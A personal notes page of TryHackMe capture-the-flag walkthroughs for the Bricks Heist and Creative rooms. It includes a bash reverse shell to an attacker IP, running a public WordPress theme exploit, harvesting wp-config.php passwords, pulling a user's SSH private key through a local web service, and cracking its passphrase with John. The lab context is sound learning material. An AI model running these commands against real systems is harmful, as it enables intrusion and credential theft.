---
layout: default
title: "TryHackMe Notes"
---

# 🏴‍☠️ TryHackMe Notes

This page contains my notes on TryHackMe challenges and walkthroughs.

### TryHack3M: Bricks Heist
- Look at the bricks.thm page and view the page source, they seem to be using WordPress.
- Do: `wpscan --url <target_url>` (To find WordPress vulnerabilities)
    - We try to use it but we can't without disabling TLS certificate checks:
        - `wpscan --url <target_url> --disable-tls-checks`
- Finds a theme: bricks with version: 1.9.5. Simply, Google it for any vulnerability present.
    - `wordpress bricks 1.9.5 exploit github`
- Found an exploit and downloading it.
    - Making the exploit file executable.
    - Downloading some requirements: `pip3 install alive-progress`
    - `python3 exploit.py -u https://bricks.thm`
- How we have shell and can "cat" the .txt file for the FLAG.
- Reverse shell command: 
    - `bash -c 'exec bash -i &>dev/tcp/10.21.135.229/4444 <&1'`
- On the listening side: `nc -lvnp 4444`
- Found an interesting file "wp-config.php" where we can find the passwords.
- Go to: `https://bricks.thm/phpmyadmin`
- To find the suspicious process on Linux: `systemctl list-units --type=service --state=running`
- Cat the suspicious process: `systemctl cat ubuntu.service` (The service name is the third answer)
- Executing from `/lib/NetworkManager` directory.
    - Let's head on to that, we may get the answers for the next questions: `cd /lib/NetworkManager`
    - Only `inet.conf` file has read-only permissions. Let's `cat` it out (This is the log file name of the miner instance?)
    - It is better to use `head`, instead of `cat`, to see the contents.
    - We can easily see the ID present over there which seems to be encoded. USE CyberChef to decode (with magic).
    - It appears to be two wallet addresses! (One of these is the answer)
        - Verified with `blockchair.com`.
        - Go into details and find who is being sent to.
        - Copy and paste into Google and you will find cyber-related designations.

### Creative
- `nmap -A -T4 -p- --min-rate 5000 10.10.21.158`
    - `-A` for OS, scripts, and service versions.
    - `-T4` for faster scan — can be level 1–5.
    - `-p-` for scanning all ports.
    - `--min-rate 5000` — to speed up scan.
- `http://10.10.21.158`
    - Redirected to `creative.thm`.
- `nano /etc/hosts`
    - `<IP>  creative.thm`
- Now we can go to: `http://creative.thm`
- `ffuf -u http://creative.thm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .html,.txt,.php,.sh,.js -t 50`
    - Found nothing.
- `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://creative.thm -H "Host: FUZZ.creative.thm" -mc 200,302,403,401`
    - We find the beta subdomain.
- Add `beta.creative.thm` to `/etc/hosts`.
- Running a script to see all services: `portbrute.py`
    - We find 1337, and 80.
- We do: `http://localhost:1337`
    - We have another web service that seems to have Directory listing enabled.
    - Maybe we can access `/etc/passwd`?
- We learn about a user called “saad” (UID 1000)!
    - Maybe we can find Saad’s SSH key and use it to log in via SSH?
    - `http://localhost:1337/home/saad/.ssh/id_rsa`
- Save the key to our machine and login:
    - `ssh -i id_rsa saad@creative.thm`
- Asks for a passphrase. We will use John to crack the passphrase:
    - `ssh2john id_rsa > forjohn` (this turns the key into a hash so John can understand).
    - `john --wordlist=/usr/share/wordlists/rockyou.txt forjohn` (to crack the passphrase).
    - `john forjohn --show` (to show the passphrase).
- `ssh -i id_rsa saad@creative.thm`
